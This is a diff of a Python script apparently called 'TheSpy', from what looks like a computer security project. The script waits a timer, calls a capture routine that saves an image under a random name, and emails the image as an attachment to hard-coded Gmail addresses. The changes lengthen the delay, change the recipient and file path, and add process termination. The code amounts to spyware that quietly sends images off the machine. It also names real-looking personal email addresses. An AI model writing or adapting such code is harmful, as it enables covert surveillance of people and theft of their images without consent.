@@ -15,7 +15,7 @@ rnum=random.randrange(20,100,1)
 imgname="TheSpy"+str(rnum)+".png"
 
 def start_time():
-        time.sleep(15)
+        time.sleep(30)
 	print "Yess"
 	capture()
 	exit()
@@ -24,7 +24,7 @@ p1 = multiprocessing.Process(target=start_time)
 
 def mailme(imgname):
 	fromaddr = "kattademane@gmail.com"
-	toaddr = "prathamanchan22@gmail.com,prathamanchan1997@gmail.com"
+	toaddr ='prathamanchan1997@gmail.com'
 	msg = MIMEMultipart()
 	msg['From'] = fromaddr
 	msg['To'] = toaddr
@@ -34,7 +34,7 @@ def mailme(imgname):
 
 	msg.attach(MIMEText(body, 'plain'))
 	filename = "THeSpy"
-	location="/home/samsung/Downloads/Security-20180908T165700Z-001/ComputerSecurity/"+imgname
+	location="/home/karmic/Desktop/ComputerSecurity/"+imgname
 	attachment = open(location, "rb")
 	p = MIMEBase('application', 'octet-stream')
 	p.set_payload((attachment).read())
@@ -63,6 +63,7 @@ def goDude():
 		time.sleep(1)
 		cmd="mv "+imgname+" continue1"+str(rnum)
 		os.system(cmd)
+		p1.terminate()
 		exit()
 
 def on_closing():
